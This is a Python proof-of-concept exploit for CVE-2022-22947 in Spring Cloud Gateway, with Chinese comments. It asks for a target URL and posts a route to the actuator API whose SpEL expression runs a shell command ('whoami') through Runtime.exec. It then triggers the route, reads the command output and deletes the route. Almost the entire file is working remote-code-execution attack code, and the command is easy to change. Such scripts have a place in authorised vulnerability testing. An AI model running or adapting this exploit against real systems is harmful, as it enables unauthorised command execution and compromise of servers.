import requests
from time import sleep
requests.packages.urllib3.disable_warnings()

'''
Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）
Spring Cloud Gateway 3.1.x < 3.1.1
Spring Cloud Gateway 3.0.x < 3.0.7
旧的、不受支持的版本也会受到影响

参考链接：
https://tanzu.vmware.com/security/cve-2022-22947
https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/
'''


def poc(url, useragent, proxies=None):
    header1 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': useragent,
        'Content-Type': 'application/json'
    }
    payload1 = '''{\r
              "id": "hacktest",\r
              "filters": [{\r
                "name": "AddResponseHeader",\r
                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"whoami\\"}).getInputStream()))}"}\r
                }],\r
              "uri": "http://example.com",\r
              "order": 0\r
            }'''

    header2 = {
        'User-Agent': useragent,
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    header3 = {
        'User-Agent': useragent
    }

    try:
        requests.post(url=url + "/actuator/gateway/routes/hacktest", headers=header1, data=payload1, timeout=10 ,verify=False, proxies=proxies) # 首先，添加一个包含恶意SpEL表达式的路由
        sleep(0.5)
        requests.post(url=url + "/actuator/gateway/refresh", headers=header2, timeout=10 ,verify=False, proxies=proxies) # 触发SpEL表达式的执行
        sleep(0.5)
        re = requests.get(url=url + "/actuator/gateway/routes/hacktest", headers=header2, timeout=10 ,verify=False, proxies=proxies) # 查看执行结果
        if 'hacktest' in str(re.text) or 'AddResponseHeader' in str(re.text):
            requests.delete(url=url + "/actuator/gateway/routes/hacktest", headers=header3, timeout=10 ,verify=False, proxies=proxies) # 删除路由
            return f'[+] CVE-2022-22947 exists, the result: {re.text}. The route has been deleted.'
        else:
            return "[-] CVE-2022-22947 not exists. Please perform manual verification."
    except Exception as e:
        return f'[-] An error occurred and it has been logged: {e}'

if __name__ == '__main__':
    print(poc(input('请输入目标url:').strip('/'), 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'))